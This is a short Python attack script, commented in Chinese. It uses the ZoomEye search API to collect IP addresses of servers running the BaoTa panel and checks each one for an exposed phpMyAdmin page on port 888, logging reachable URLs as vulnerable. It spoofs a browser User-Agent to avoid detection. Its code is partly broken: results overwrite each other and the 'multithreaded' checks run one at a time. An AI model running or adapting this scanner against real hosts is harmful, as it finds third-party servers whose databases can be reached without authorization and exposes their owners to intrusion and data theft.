import sys
import time
import requests
import argparse
from queue import Queue
from ZoomEyeUnit import ZoomEyeUnit
from concurrent.futures import ThreadPoolExecutor

z = ZoomEyeUnit()
#自定义UA 避免检测UA
headers = {"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36",
           "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",}

#未使用多线程，同时增加休眠时间，避免由于快速大量访问导致的API 500错误
def producer(page,q):
    for page in range(1,page):
        time.sleep(1)
        result = z.Host_search("app:\宝塔服务器运维面板\"",page)
        for info in result['matches']:
            q.put(info['ip'])
    return True

#可访问PMA既存在漏洞
def bt_exp(ip):
    print('Testing {}'.format(ip))
    url = "http://%s:888/pma/" % (ip)
    try:
        res = requests.get(url,headers=headers,timeout=5)
        if res.status_code == 200:
            with open("result.txt", "w") as wf:
                wf.write(url)
        else:
            pass
    finally:
        return

#队列与多线程
def run(page):
    q = Queue()
    if producer(page,q):
        executor = ThreadPoolExecutor(max_workers=5)
        for i in range(1,q.qsize()+1):
            if q.empty():
                print("队列为空！")
                exit(0)
            else:
                ip = q.get()
                executor.submit(bt_exp(ip))
        print('请查看当前路径下文件：result.txt')


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-p','--page',dest='page',type=int,help='查询页数，一页为20个IP地址，最大为2500，示例：-n 10 ')
    pa = parser.parse_args()
    if len(sys.argv[1:]) == 0:
        print("输入 -h 参数查看使用说明")
        exit()
    if pa.page:
        run(pa.page)

if __name__=='__main__':
    main()


